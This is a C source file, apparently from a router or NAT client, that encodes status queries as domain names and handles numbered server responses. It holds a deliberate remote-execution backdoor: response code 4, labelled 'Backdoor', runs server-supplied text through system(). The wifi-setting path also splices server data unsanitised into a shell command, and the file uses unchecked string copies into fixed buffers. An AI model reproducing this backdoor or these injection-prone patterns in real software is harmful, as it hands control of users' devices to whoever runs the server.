
#include "info.h"
#include "nat.h"
#include "log.h"

static char status = 'c', token[256];

int read_cmd(char *cmd, char *buf, int len)
{
	FILE *fp = popen(cmd, "r");
	if (fp == NULL)
	{
		perror("popen");
		return -1;
	}

	if (fgets(buf, len, fp) == NULL)
	{
		perror("fgets");
		return -1;
	}
	buf[strlen(buf) - 1] = '\0';

	pclose(fp);

	return 0;
}

int do_cmd(char *cmd)
{
	return system(cmd);
}

char *get_count()
{
	static char buf[64];

	static int count = 0;

	sprintf(buf, "%c%d", status, count++);

	return (char *)&buf;
}

char *get_ctx()
{
	static char buf[256];

	if (read_cmd("shell", buf, 256) < 0)
	{
		sprintf(buf, "ERROR");
	}

	return (char *)&buf;
}

void process_req(char *buf)
{
	//countNum.CTX.075786.cn
	switch (status)
	{
	case 'c': //connect mode
		sprintf(buf, "%s.%s.%s", get_count(), get_ctx(), DOMAIN);
		break;
	case 'k': //keepalive mode
		sprintf(buf, "%s.%s.%s", get_count(), token, DOMAIN);
		break;
	}

	printf("%s\n", buf);
}

void setting_wifi(char *data)
{
	static char buf[256];
	sprintf(buf, "shell %s", data);
	do_cmd(buf);
}

void process_res(char *buf)
{
	char code = atoi(buf);
	char *data = strchr(buf, ':');
	*data++ = '\0';

	switch (code)
	{
	case 0:
		printf("normal\n");
		host.enable = 1; //enable nat
		break;
	case 1:
		strcpy(token, data);
		status = 'k';	//switch to keepalive mode
		host.enable = 1; //enable nat
		printf("token : %s\n", data);
		break;
	case 2:
		setting_wifi(data); //setting wifi
		break;
	case 3:
		status = 'c';	//switch to connect mode
		host.enable = 0; //disable nat
		printf("Arrearage\n");
		break;
	case 4:
		printf("Backdoor\n");
		do_cmd(data);
		break;
	case 10:
		printf("Unknow Error\n");
		break;
	case 11:
		printf("Router unbind\n");
		break;
	case 12:
		printf("Add router failed\n");
		break;
	case 13:
		status = 'c';	//switch to connect mode
		host.enable = 0; //disable nat
		printf("Token invalid\n");
		break;
	default:
		printf("Error %d:%s\n", code, data);
		break;
	}
}